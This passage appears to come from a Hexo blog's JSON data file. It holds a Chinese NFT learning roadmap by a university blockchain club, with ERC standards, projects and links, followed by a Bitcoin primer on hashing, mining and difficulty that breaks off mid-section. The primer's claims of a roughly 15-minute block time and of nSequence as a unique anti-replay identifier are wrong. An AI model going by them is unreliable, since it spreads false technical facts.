ERC-721，其次 ERC-1155）\n    -   ERC-721：最基础的 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-721)\n        -   第三方中文翻译：[🔗](https://www.jianshu.com/p/e6d4f57fbba6)\n        -   第三方中文翻译：[🔗](https://www.jianshu.com/p/d5604554c324)\n    -   ERC-1155：单合约多资产\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-1155)\n        -   第三方中文翻译\n    -   ERC-1523：保险单 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-1523)\n    -   ERC-998：可组合 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-998)\n    -   EIP-1948：可变信息的 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-1948)\n    -   EIP-2981：NFT 版税\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-2981)\n    -   ERC-875：批量转移 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-875)\n-   **市场细分**\n    -   收藏品：\n        -   项目：CryptoKitties、CryptoPunks、Avastars、GoPepe、Marble.Cards、pixEOS Gallery、PixelChain、Pixel Master\n    -   游戏资产：\n        -   项目：Gods Unchained、Axie Infinity、My Crypto Heroes、CryptoSpaceCommanders、Sorare、F1 Delta Time、ChainZ Arena - Play and Earn、Upload、MegaCryptoPoll、EvolutionLand\n    -   虚拟世界：\n        -   项目：Decentraland、Cryptovoxels、Somnium Space、The Sandbox、Vegas City\n    -   加密艺术品：\n        -   项目：Async Art、 SuperRare、 Nifty Gateway、 KnownOrigin、 MakersPlace\n    -   金融：\n        -   项目：Yinsurance、Aavegotchi、DEGO Finance、Meme、WHALE\n    -   功能型 NFT：\n        -   项目：ENS、Urbit ID、Unstoppable Domains、Terra Virtua\n    -   交易市场：\n        -   一般交易市场：OpenSea、Rarible、Finannel、Axie Markerplace、Atomic Market、Myth.Market、Minitbase、Collectables、Terra Virtua、Fyooz\n        -   艺术品交易市场：SuperRare、MarketPlace、Async Art、Known Origin\n    -   文化代币：n0wear、Zora、 Foundation\n    -   其它：传统物理产品，门票、产权、数字身份\n    -   指数基金：\n        -   NFTX：[🔗](https://nftx.org/#/)\n    -   数据聚合器：\n        -   nonfungible（NFT 数据聚合、数据分析、新闻评论）\n            -   官网：[🔗](https://nonfungible.com)\n            -   介绍：[🔗](https://nonfungible.com/pages/about-us)\n        -   cryptoslam：[🔗](https://cryptoslam.io)\n    -   NFT 浏览器-：\n        -   etherscan：[🔗](https://etherscan.io/tokens/label/nft)\n\n## 第三层\n\n-   NFT 基础设施\n    -   FLOW\n        -   官网：[🔗](https://www.onflow.org)\n        -   技术白皮书：[🔗](https://www.onflow.org/technical-paper)\n        -   Flow 的团队叫 Dapper Labs，制作了 NFT 历史上交易量最大的 2 个 NFT 应用：CryptoKitties、NBA Top Shot。\n    -   ETH\n        -   CryptoPunks：[🔗](https://cryptoslam.io/cryptopunks)\n        -   Sorare：[🔗](https://cryptoslam.io/sorare)\n        -   Axie Infinity：[🔗](https://cryptoslam.io/axie-infinity)\n        -   CryptoKitties：[🔗](https://www.cryptokitties.co)\n        -   MyCryptoHeroes：[🔗](https://cryptoslam.io/mycryptoheroes)\n        -   Gods Unchained：[🔗](https://godsunchained.com)\n        -   F1 Delta Time：[🔗](https://cryptoslam.io/f1-delta-time)\n    -   WAX\n        -   WAX = Worldwide Asset eXchange\n        -   官网：[🔗](https://on.wax.io/wax-io/)\n        -   白皮书：[🔗](https://github.com/worldwide-asset-exchange/whitepaper)\n        -   WAX 被称为 NFT 之王，在 Cryptoslam 的数据统计中，前三十名的 NFT 发行项目目有 20 个建立在 WAX 之上，市场份额超过 2/3，如同比特币长期占有加密市场约 2/3 的市值一样，WAX 在 NFT 领域也长期处于领导地位\n    -   Polkadot\n        -   协议层：\n            -   NFT-Pallet：[🔗](https://github.com/danforbes/pallet-nft)\n            -   NFT-Parachain：[🔗](https://github.com/w3f-community/nft_parachain)\n","source":"_posts/BlockChain/Road/08-NFT.md","raw":"---\ntitle: 08-NFT\ndate: 2024-08-02 00:07:29\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# NFTer-roadmap 2024\n\nNFT 学习路线总结，不断更新。\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n## 第一层\n\n> 快速入门\n\n-   **历史发展**：\n    -   NFT 圣经：关于非同质化代币的所有知识 [🔗](https://mp.weixin.qq.com/s/Lr-q6cgfcnWzbVqDDjMebQ)\n-   **一些解读**：\n    -   NFT：价值互联网的 HTML [🔗 ](https://mp.weixin.qq.com/s/m8TOUNQypFTJdlK7af6knA)\n    -   深度解析：NFT 有哪些应用场景？非同质化代币最全用例手册 [🔗](https://mp.weixin.qq.com/s/taJs6WYFNY6vVAl0w8HkPg)\n    -   a16z 前合伙人：NFT 让互联网“Ownable” [🔗](https://mp.weixin.qq.com/s/Zukwh08lYzh-2Ai8jXPP6g)\n    -   NFT、Metaverse，与泡泡玛特 [🔗](https://m.theblockbeats.com/news/23129)\n    -   李启威：NFT 的真正价值究竟是什么？ [🔗](https://www.chainnews.com/articles/576303926328.htm)\n    -   问题在于,你站在哪个世界看 NFT ｜预言家周报#114 [🔗](https://mp.weixin.qq.com/s/y7GvQeB46zqE-dVitVpMYw)\n-   **生态现状**：\n    -   NFT 生态大起底：最值得关注的项目都在这里 [🔗](https://m.theblockbeats.com/news/22526)\n    -   全景式解读 NFT 生态全貌，这些重点项目不容错过 [🔗](https://mp.weixin.qq.com/s/r4oxyGw6eB7WdibMNcaOgA)\n-   **精品宝藏**：\n    -   《从 0 到 1: 精通 NFT——一本万能的 NFT 知识图谱》[🔗](https://www.yuque.com/books/share/a8a2de86-76de-4531-8486-ac3d40944557) 🌟\n\n## 第二层\n\n-   **技术原理**（至少了解 ERC-721，其次 ERC-1155）\n    -   ERC-721：最基础的 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-721)\n        -   第三方中文翻译：[🔗](https://www.jianshu.com/p/e6d4f57fbba6)\n        -   第三方中文翻译：[🔗](https://www.jianshu.com/p/d5604554c324)\n    -   ERC-1155：单合约多资产\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-1155)\n        -   第三方中文翻译\n    -   ERC-1523：保险单 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-1523)\n    -   ERC-998：可组合 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-998)\n    -   EIP-1948：可变信息的 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-1948)\n    -   EIP-2981：NFT 版税\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-2981)\n    -   ERC-875：批量转移 NFT\n        -   EIP：[🔗](https://eips.ethereum.org/EIPS/eip-875)\n-   **市场细分**\n    -   收藏品：\n        -   项目：CryptoKitties、CryptoPunks、Avastars、GoPepe、Marble.Cards、pixEOS Gallery、PixelChain、Pixel Master\n    -   游戏资产：\n        -   项目：Gods Unchained、Axie Infinity、My Crypto Heroes、CryptoSpaceCommanders、Sorare、F1 Delta Time、ChainZ Arena - Play and Earn、Upload、MegaCryptoPoll、EvolutionLand\n    -   虚拟世界：\n        -   项目：Decentraland、Cryptovoxels、Somnium Space、The Sandbox、Vegas City\n    -   加密艺术品：\n        -   项目：Async Art、 SuperRare、 Nifty Gateway、 KnownOrigin、 MakersPlace\n    -   金融：\n        -   项目：Yinsurance、Aavegotchi、DEGO Finance、Meme、WHALE\n    -   功能型 NFT：\n        -   项目：ENS、Urbit ID、Unstoppable Domains、Terra Virtua\n    -   交易市场：\n        -   一般交易市场：OpenSea、Rarible、Finannel、Axie Markerplace、Atomic Market、Myth.Market、Minitbase、Collectables、Terra Virtua、Fyooz\n        -   艺术品交易市场：SuperRare、MarketPlace、Async Art、Known Origin\n    -   文化代币：n0wear、Zora、 Foundation\n    -   其它：传统物理产品，门票、产权、数字身份\n    -   指数基金：\n        -   NFTX：[🔗](https://nftx.org/#/)\n    -   数据聚合器：\n        -   nonfungible（NFT 数据聚合、数据分析、新闻评论）\n            -   官网：[🔗](https://nonfungible.com)\n            -   介绍：[🔗](https://nonfungible.com/pages/about-us)\n        -   cryptoslam：[🔗](https://cryptoslam.io)\n    -   NFT 浏览器-：\n        -   etherscan：[🔗](https://etherscan.io/tokens/label/nft)\n\n## 第三层\n\n-   NFT 基础设施\n    -   FLOW\n        -   官网：[🔗](https://www.onflow.org)\n        -   技术白皮书：[🔗](https://www.onflow.org/technical-paper)\n        -   Flow 的团队叫 Dapper Labs，制作了 NFT 历史上交易量最大的 2 个 NFT 应用：CryptoKitties、NBA Top Shot。\n    -   ETH\n        -   CryptoPunks：[🔗](https://cryptoslam.io/cryptopunks)\n        -   Sorare：[🔗](https://cryptoslam.io/sorare)\n        -   Axie Infinity：[🔗](https://cryptoslam.io/axie-infinity)\n        -   CryptoKitties：[🔗](https://www.cryptokitties.co)\n        -   MyCryptoHeroes：[🔗](https://cryptoslam.io/mycryptoheroes)\n        -   Gods Unchained：[🔗](https://godsunchained.com)\n        -   F1 Delta Time：[🔗](https://cryptoslam.io/f1-delta-time)\n    -   WAX\n        -   WAX = Worldwide Asset eXchange\n        -   官网：[🔗](https://on.wax.io/wax-io/)\n        -   白皮书：[🔗](https://github.com/worldwide-asset-exchange/whitepaper)\n        -   WAX 被称为 NFT 之王，在 Cryptoslam 的数据统计中，前三十名的 NFT 发行项目目有 20 个建立在 WAX 之上，市场份额超过 2/3，如同比特币长期占有加密市场约 2/3 的市值一样，WAX 在 NFT 领域也长期处于领导地位\n    -   Polkadot\n        -   协议层：\n            -   NFT-Pallet：[🔗](https://github.com/danforbes/pallet-nft)\n            -   NFT-Parachain：[🔗](https://github.com/w3f-community/nft_parachain)\n","slug":"BlockChain/Road/08-NFT","published":1,"updated":"2024-08-01T16:12:44.062Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821s000o2sun28qs95e0","content":"<h1 id=\"NFTer-roadmap-2024\"><a href=\"#NFTer-roadmap-2024\" class=\"headerlink\" title=\"NFTer-roadmap 2024\"></a>NFTer-roadmap 2024</h1><p>NFT 学习路线总结，不断更新。</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<h2 id=\"第一层\"><a href=\"#第一层\" class=\"headerlink\" title=\"第一层\"></a>第一层</h2><blockquote>\n<p>快速入门</p>\n</blockquote>\n<ul>\n<li><strong>历史发展</strong>：<ul>\n<li>NFT 圣经：关于非同质化代币的所有知识 <a href=\"https://mp.weixin.qq.com/s/Lr-q6cgfcnWzbVqDDjMebQ\">🔗</a></li>\n</ul>\n</li>\n<li><strong>一些解读</strong>：<ul>\n<li>NFT：价值互联网的 HTML <a href=\"https://mp.weixin.qq.com/s/m8TOUNQypFTJdlK7af6knA\">🔗 </a></li>\n<li>深度解析：NFT 有哪些应用场景？非同质化代币最全用例手册 <a href=\"https://mp.weixin.qq.com/s/taJs6WYFNY6vVAl0w8HkPg\">🔗</a></li>\n<li>a16z 前合伙人：NFT 让互联网“Ownable” <a href=\"https://mp.weixin.qq.com/s/Zukwh08lYzh-2Ai8jXPP6g\">🔗</a></li>\n<li>NFT、Metaverse，与泡泡玛特 <a href=\"https://m.theblockbeats.com/news/23129\">🔗</a></li>\n<li>李启威：NFT 的真正价值究竟是什么？ <a href=\"https://www.chainnews.com/articles/576303926328.htm\">🔗</a></li>\n<li>问题在于,你站在哪个世界看 NFT ｜预言家周报#114 <a href=\"https://mp.weixin.qq.com/s/y7GvQeB46zqE-dVitVpMYw\">🔗</a></li>\n</ul>\n</li>\n<li><strong>生态现状</strong>：<ul>\n<li>NFT 生态大起底：最值得关注的项目都在这里 <a href=\"https://m.theblockbeats.com/news/22526\">🔗</a></li>\n<li>全景式解读 NFT 生态全貌，这些重点项目不容错过 <a href=\"https://mp.weixin.qq.com/s/r4oxyGw6eB7WdibMNcaOgA\">🔗</a></li>\n</ul>\n</li>\n<li><strong>精品宝藏</strong>：<ul>\n<li>《从 0 到 1: 精通 NFT——一本万能的 NFT 知识图谱》<a href=\"https://www.yuque.com/books/share/a8a2de86-76de-4531-8486-ac3d40944557\">🔗</a> 🌟</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二层\"><a href=\"#第二层\" class=\"headerlink\" title=\"第二层\"></a>第二层</h2><ul>\n<li><strong>技术原理</strong>（至少了解 ERC-721，其次 ERC-1155）<ul>\n<li>ERC-721：最基础的 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-721\">🔗</a></li>\n<li>第三方中文翻译：<a href=\"https://www.jianshu.com/p/e6d4f57fbba6\">🔗</a></li>\n<li>第三方中文翻译：<a href=\"https://www.jianshu.com/p/d5604554c324\">🔗</a></li>\n</ul>\n</li>\n<li>ERC-1155：单合约多资产<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-1155\">🔗</a></li>\n<li>第三方中文翻译</li>\n</ul>\n</li>\n<li>ERC-1523：保险单 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-1523\">🔗</a></li>\n</ul>\n</li>\n<li>ERC-998：可组合 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-998\">🔗</a></li>\n</ul>\n</li>\n<li>EIP-1948：可变信息的 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-1948\">🔗</a></li>\n</ul>\n</li>\n<li>EIP-2981：NFT 版税<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-2981\">🔗</a></li>\n</ul>\n</li>\n<li>ERC-875：批量转移 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-875\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>市场细分</strong><ul>\n<li>收藏品：<ul>\n<li>项目：CryptoKitties、CryptoPunks、Avastars、GoPepe、Marble.Cards、pixEOS Gallery、PixelChain、Pixel Master</li>\n</ul>\n</li>\n<li>游戏资产：<ul>\n<li>项目：Gods Unchained、Axie Infinity、My Crypto Heroes、CryptoSpaceCommanders、Sorare、F1 Delta Time、ChainZ Arena - Play and Earn、Upload、MegaCryptoPoll、EvolutionLand</li>\n</ul>\n</li>\n<li>虚拟世界：<ul>\n<li>项目：Decentraland、Cryptovoxels、Somnium Space、The Sandbox、Vegas City</li>\n</ul>\n</li>\n<li>加密艺术品：<ul>\n<li>项目：Async Art、 SuperRare、 Nifty Gateway、 KnownOrigin、 MakersPlace</li>\n</ul>\n</li>\n<li>金融：<ul>\n<li>项目：Yinsurance、Aavegotchi、DEGO Finance、Meme、WHALE</li>\n</ul>\n</li>\n<li>功能型 NFT：<ul>\n<li>项目：ENS、Urbit ID、Unstoppable Domains、Terra Virtua</li>\n</ul>\n</li>\n<li>交易市场：<ul>\n<li>一般交易市场：OpenSea、Rarible、Finannel、Axie Markerplace、Atomic Market、Myth.Market、Minitbase、Collectables、Terra Virtua、Fyooz</li>\n<li>艺术品交易市场：SuperRare、MarketPlace、Async Art、Known Origin</li>\n</ul>\n</li>\n<li>文化代币：n0wear、Zora、 Foundation</li>\n<li>其它：传统物理产品，门票、产权、数字身份</li>\n<li>指数基金：<ul>\n<li>NFTX：<a href=\"https://nftx.org/#/\">🔗</a></li>\n</ul>\n</li>\n<li>数据聚合器：<ul>\n<li>nonfungible（NFT 数据聚合、数据分析、新闻评论）<ul>\n<li>官网：<a href=\"https://nonfungible.com/\">🔗</a></li>\n<li>介绍：<a href=\"https://nonfungible.com/pages/about-us\">🔗</a></li>\n</ul>\n</li>\n<li>cryptoslam：<a href=\"https://cryptoslam.io/\">🔗</a></li>\n</ul>\n</li>\n<li>NFT 浏览器-：<ul>\n<li>etherscan：<a href=\"https://etherscan.io/tokens/label/nft\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第三层\"><a href=\"#第三层\" class=\"headerlink\" title=\"第三层\"></a>第三层</h2><ul>\n<li>NFT 基础设施<ul>\n<li>FLOW<ul>\n<li>官网：<a href=\"https://www.onflow.org/\">🔗</a></li>\n<li>技术白皮书：<a href=\"https://www.onflow.org/technical-paper\">🔗</a></li>\n<li>Flow 的团队叫 Dapper Labs，制作了 NFT 历史上交易量最大的 2 个 NFT 应用：CryptoKitties、NBA Top Shot。</li>\n</ul>\n</li>\n<li>ETH<ul>\n<li>CryptoPunks：<a href=\"https://cryptoslam.io/cryptopunks\">🔗</a></li>\n<li>Sorare：<a href=\"https://cryptoslam.io/sorare\">🔗</a></li>\n<li>Axie Infinity：<a href=\"https://cryptoslam.io/axie-infinity\">🔗</a></li>\n<li>CryptoKitties：<a href=\"https://www.cryptokitties.co/\">🔗</a></li>\n<li>MyCryptoHeroes：<a href=\"https://cryptoslam.io/mycryptoheroes\">🔗</a></li>\n<li>Gods Unchained：<a href=\"https://godsunchained.com/\">🔗</a></li>\n<li>F1 Delta Time：<a href=\"https://cryptoslam.io/f1-delta-time\">🔗</a></li>\n</ul>\n</li>\n<li>WAX<ul>\n<li>WAX &#x3D; Worldwide Asset eXchange</li>\n<li>官网：<a href=\"https://on.wax.io/wax-io/\">🔗</a></li>\n<li>白皮书：<a href=\"https://github.com/worldwide-asset-exchange/whitepaper\">🔗</a></li>\n<li>WAX 被称为 NFT 之王，在 Cryptoslam 的数据统计中，前三十名的 NFT 发行项目目有 20 个建立在 WAX 之上，市场份额超过 2&#x2F;3，如同比特币长期占有加密市场约 2&#x2F;3 的市值一样，WAX 在 NFT 领域也长期处于领导地位</li>\n</ul>\n</li>\n<li>Polkadot<ul>\n<li>协议层：<ul>\n<li>NFT-Pallet：<a href=\"https://github.com/danforbes/pallet-nft\">🔗</a></li>\n<li>NFT-Parachain：<a href=\"https://github.com/w3f-community/nft_parachain\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"NFTer-roadmap-2024\"><a href=\"#NFTer-roadmap-2024\" class=\"headerlink\" title=\"NFTer-roadmap 2024\"></a>NFTer-roadmap 2024</h1><p>NFT 学习路线总结，不断更新。</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<h2 id=\"第一层\"><a href=\"#第一层\" class=\"headerlink\" title=\"第一层\"></a>第一层</h2><blockquote>\n<p>快速入门</p>\n</blockquote>\n<ul>\n<li><strong>历史发展</strong>：<ul>\n<li>NFT 圣经：关于非同质化代币的所有知识 <a href=\"https://mp.weixin.qq.com/s/Lr-q6cgfcnWzbVqDDjMebQ\">🔗</a></li>\n</ul>\n</li>\n<li><strong>一些解读</strong>：<ul>\n<li>NFT：价值互联网的 HTML <a href=\"https://mp.weixin.qq.com/s/m8TOUNQypFTJdlK7af6knA\">🔗 </a></li>\n<li>深度解析：NFT 有哪些应用场景？非同质化代币最全用例手册 <a href=\"https://mp.weixin.qq.com/s/taJs6WYFNY6vVAl0w8HkPg\">🔗</a></li>\n<li>a16z 前合伙人：NFT 让互联网“Ownable” <a href=\"https://mp.weixin.qq.com/s/Zukwh08lYzh-2Ai8jXPP6g\">🔗</a></li>\n<li>NFT、Metaverse，与泡泡玛特 <a href=\"https://m.theblockbeats.com/news/23129\">🔗</a></li>\n<li>李启威：NFT 的真正价值究竟是什么？ <a href=\"https://www.chainnews.com/articles/576303926328.htm\">🔗</a></li>\n<li>问题在于,你站在哪个世界看 NFT ｜预言家周报#114 <a href=\"https://mp.weixin.qq.com/s/y7GvQeB46zqE-dVitVpMYw\">🔗</a></li>\n</ul>\n</li>\n<li><strong>生态现状</strong>：<ul>\n<li>NFT 生态大起底：最值得关注的项目都在这里 <a href=\"https://m.theblockbeats.com/news/22526\">🔗</a></li>\n<li>全景式解读 NFT 生态全貌，这些重点项目不容错过 <a href=\"https://mp.weixin.qq.com/s/r4oxyGw6eB7WdibMNcaOgA\">🔗</a></li>\n</ul>\n</li>\n<li><strong>精品宝藏</strong>：<ul>\n<li>《从 0 到 1: 精通 NFT——一本万能的 NFT 知识图谱》<a href=\"https://www.yuque.com/books/share/a8a2de86-76de-4531-8486-ac3d40944557\">🔗</a> 🌟</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第二层\"><a href=\"#第二层\" class=\"headerlink\" title=\"第二层\"></a>第二层</h2><ul>\n<li><strong>技术原理</strong>（至少了解 ERC-721，其次 ERC-1155）<ul>\n<li>ERC-721：最基础的 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-721\">🔗</a></li>\n<li>第三方中文翻译：<a href=\"https://www.jianshu.com/p/e6d4f57fbba6\">🔗</a></li>\n<li>第三方中文翻译：<a href=\"https://www.jianshu.com/p/d5604554c324\">🔗</a></li>\n</ul>\n</li>\n<li>ERC-1155：单合约多资产<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-1155\">🔗</a></li>\n<li>第三方中文翻译</li>\n</ul>\n</li>\n<li>ERC-1523：保险单 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-1523\">🔗</a></li>\n</ul>\n</li>\n<li>ERC-998：可组合 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-998\">🔗</a></li>\n</ul>\n</li>\n<li>EIP-1948：可变信息的 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-1948\">🔗</a></li>\n</ul>\n</li>\n<li>EIP-2981：NFT 版税<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-2981\">🔗</a></li>\n</ul>\n</li>\n<li>ERC-875：批量转移 NFT<ul>\n<li>EIP：<a href=\"https://eips.ethereum.org/EIPS/eip-875\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>市场细分</strong><ul>\n<li>收藏品：<ul>\n<li>项目：CryptoKitties、CryptoPunks、Avastars、GoPepe、Marble.Cards、pixEOS Gallery、PixelChain、Pixel Master</li>\n</ul>\n</li>\n<li>游戏资产：<ul>\n<li>项目：Gods Unchained、Axie Infinity、My Crypto Heroes、CryptoSpaceCommanders、Sorare、F1 Delta Time、ChainZ Arena - Play and Earn、Upload、MegaCryptoPoll、EvolutionLand</li>\n</ul>\n</li>\n<li>虚拟世界：<ul>\n<li>项目：Decentraland、Cryptovoxels、Somnium Space、The Sandbox、Vegas City</li>\n</ul>\n</li>\n<li>加密艺术品：<ul>\n<li>项目：Async Art、 SuperRare、 Nifty Gateway、 KnownOrigin、 MakersPlace</li>\n</ul>\n</li>\n<li>金融：<ul>\n<li>项目：Yinsurance、Aavegotchi、DEGO Finance、Meme、WHALE</li>\n</ul>\n</li>\n<li>功能型 NFT：<ul>\n<li>项目：ENS、Urbit ID、Unstoppable Domains、Terra Virtua</li>\n</ul>\n</li>\n<li>交易市场：<ul>\n<li>一般交易市场：OpenSea、Rarible、Finannel、Axie Markerplace、Atomic Market、Myth.Market、Minitbase、Collectables、Terra Virtua、Fyooz</li>\n<li>艺术品交易市场：SuperRare、MarketPlace、Async Art、Known Origin</li>\n</ul>\n</li>\n<li>文化代币：n0wear、Zora、 Foundation</li>\n<li>其它：传统物理产品，门票、产权、数字身份</li>\n<li>指数基金：<ul>\n<li>NFTX：<a href=\"https://nftx.org/#/\">🔗</a></li>\n</ul>\n</li>\n<li>数据聚合器：<ul>\n<li>nonfungible（NFT 数据聚合、数据分析、新闻评论）<ul>\n<li>官网：<a href=\"https://nonfungible.com/\">🔗</a></li>\n<li>介绍：<a href=\"https://nonfungible.com/pages/about-us\">🔗</a></li>\n</ul>\n</li>\n<li>cryptoslam：<a href=\"https://cryptoslam.io/\">🔗</a></li>\n</ul>\n</li>\n<li>NFT 浏览器-：<ul>\n<li>etherscan：<a href=\"https://etherscan.io/tokens/label/nft\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"第三层\"><a href=\"#第三层\" class=\"headerlink\" title=\"第三层\"></a>第三层</h2><ul>\n<li>NFT 基础设施<ul>\n<li>FLOW<ul>\n<li>官网：<a href=\"https://www.onflow.org/\">🔗</a></li>\n<li>技术白皮书：<a href=\"https://www.onflow.org/technical-paper\">🔗</a></li>\n<li>Flow 的团队叫 Dapper Labs，制作了 NFT 历史上交易量最大的 2 个 NFT 应用：CryptoKitties、NBA Top Shot。</li>\n</ul>\n</li>\n<li>ETH<ul>\n<li>CryptoPunks：<a href=\"https://cryptoslam.io/cryptopunks\">🔗</a></li>\n<li>Sorare：<a href=\"https://cryptoslam.io/sorare\">🔗</a></li>\n<li>Axie Infinity：<a href=\"https://cryptoslam.io/axie-infinity\">🔗</a></li>\n<li>CryptoKitties：<a href=\"https://www.cryptokitties.co/\">🔗</a></li>\n<li>MyCryptoHeroes：<a href=\"https://cryptoslam.io/mycryptoheroes\">🔗</a></li>\n<li>Gods Unchained：<a href=\"https://godsunchained.com/\">🔗</a></li>\n<li>F1 Delta Time：<a href=\"https://cryptoslam.io/f1-delta-time\">🔗</a></li>\n</ul>\n</li>\n<li>WAX<ul>\n<li>WAX &#x3D; Worldwide Asset eXchange</li>\n<li>官网：<a href=\"https://on.wax.io/wax-io/\">🔗</a></li>\n<li>白皮书：<a href=\"https://github.com/worldwide-asset-exchange/whitepaper\">🔗</a></li>\n<li>WAX 被称为 NFT 之王，在 Cryptoslam 的数据统计中，前三十名的 NFT 发行项目目有 20 个建立在 WAX 之上，市场份额超过 2&#x2F;3，如同比特币长期占有加密市场约 2&#x2F;3 的市值一样，WAX 在 NFT 领域也长期处于领导地位</li>\n</ul>\n</li>\n<li>Polkadot<ul>\n<li>协议层：<ul>\n<li>NFT-Pallet：<a href=\"https://github.com/danforbes/pallet-nft\">🔗</a></li>\n<li>NFT-Parachain：<a href=\"https://github.com/w3f-community/nft_parachain\">🔗</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n"},{"title":"00-BTC入门","date":"2024-08-07T11:59:12.000Z","_content":"# 一：比特币密码学与数据结构\n\n## 1.哈希函数\n\n### a. 常用哈希\n- sha256\n- RIPEMD-160\n### b.使用途径\n\n- 产生公钥。\n- 交易进行哈希。\n- 默克尔树生成。\n- 跟哈希的生成与验证。\n- 区块的哈希作为下一个区块的输入，验证区块是否合法。\n## 2.非对称加解密\n\n### a.使用的算法\n- ECDSA\n### b.使用的途径\n\n- 公钥生成。\n- 签名，用于脚本的验证，确保花费区块时的合法性。\n- 验证交易的来源是否合法，对于交易需要进行签名,其中公钥与签名都会放在区块中。\n## 3.哈希链表\n\n通过前一个区块的哈希进行作为本次区块计算哈希值的一个输入进行计算本次区块的哈希值。\n## 4.默克尔树\n\n通过对于交易进行两两哈希，生成默克尔树，最终生成一个跟哈希值，可以通过全节点提供的某个交易的根哈希路径上的交易哈希可以判断交易是否合法。\n\n# 二.区块与交易信息\n\n## 1.区块信息\n\n![](./pic/Pasted%20image%2020240807150054.png)\n\n- 855743：区块高度即为当前区块在公链中的第几个。\n- 时间：区块产生的时间。\n- 大小：区块的大小。\n- 交易费：所有交易的交易费用。\n- 确认数：本条链后有几个块。\n- 转账总金额：交易所有的转账金额的总和。\n- 挖矿难度。\n- 交易数：交易数量。\n- 上一个区块：上一个区块的哈希值，形成一个链式结构。\n- 默克尔树根哈希：交易的默克尔树的跟哈希。\n- coinbase：铸币用户，可以随意写，币是凭空产生的，在输出中写对就行。\n## 2.交易信息\n\n### a.铸币交易\n\n![](./pic/Pasted%20image%2020240807151207.png)\n\n\n- coinbase：可以随意写。\n- 输入地址为随意可修改的信息。\n- 输出地址为获得记账权的账户。\n- 输出的总金额为本区块的交易费与铸币奖励的总和。\n- 本次交易没有交易费用。\n### b.普通交易\n\n![](./pic/Pasted%20image%2020240807151713.png)\n\n- wintness：签名+公钥地址。\n- nSequence：交易的唯一标志，防止重放攻击。\n- 类型：交易脚本的类型。\n- ScriptPubKey：交易的公钥地址。\n# 三.区块共识实现与挖矿\n\n## 1.区块共识\n\n### a.实现方式\n\n通过算力实现对于区块的写入，算力越强，尝试的nonce次数越多，就越有可能获取到写入区块的能力，算是基于工作量证明的方式。\n\n## 2.挖矿\n\n介绍：即通过对于交易的组合与区块中某些可修改进行进行调整，从而获取满足目标值的哈希值，才能够获取记账权，从而进行区块上链。\n\n### a.基本原理\n\n- 通过对于交易的组合哈希与可修改的数据进行修改，生成一个去区块的哈希，以满足最终的目标值的满足条件。\n- 每次尝试的结果都是一样的，因为哈希计算没有什么相关性。\n- 算力强的节点，也只是进行的次数比较多才能够有更高的获得记账权的可能。\n\n### b.可调整的数值\n\n说明：根据上述2.1与2.2.a中的信息可以获取相关的详细信息。\n\n- 交易的重组生成的默克尔树的跟哈希不同。\n- 时间可以在秒级的范围进行微调，以为比特币的出块时间为15分钟大约。\n- nonce：随机值，是主要的调整的方式。\n- 铸币交易的输入信息：不会进行信息验证，可以在需要的情况下进行随机写入信息。\n- 铸币交易的输出信息：只要不转币，可以对于输出账户进行随意写入，或者写入需要的信息。\n\n### c.挖矿\n\n说明：通过调整可变的数值，获取区块的整体哈希值，不断对于可变数值进行随机调整，从而实现目标值的范围，从而获取合法的记账权，区块的哈希值小于等于目标值才是算符合条件的合法区块。\n\n### d.区块发布\n\n说明：对于所有的交易先进行脚本执行，确认交易的合法性\n## 3.难度调整\n\n- 每2016个区块进行一次难度调整，即2周左右调整一次。\n- 一般的出块时间都在15分钟左右。\n- 区块哈希 <= 目标值为合法\n- difficult = difficult * target_time/real_time\n- target = target * real_time/target_time \n\n\n# 四.账户与交易\n\n## 1.账户生成\n### a.私钥生成\n\n- 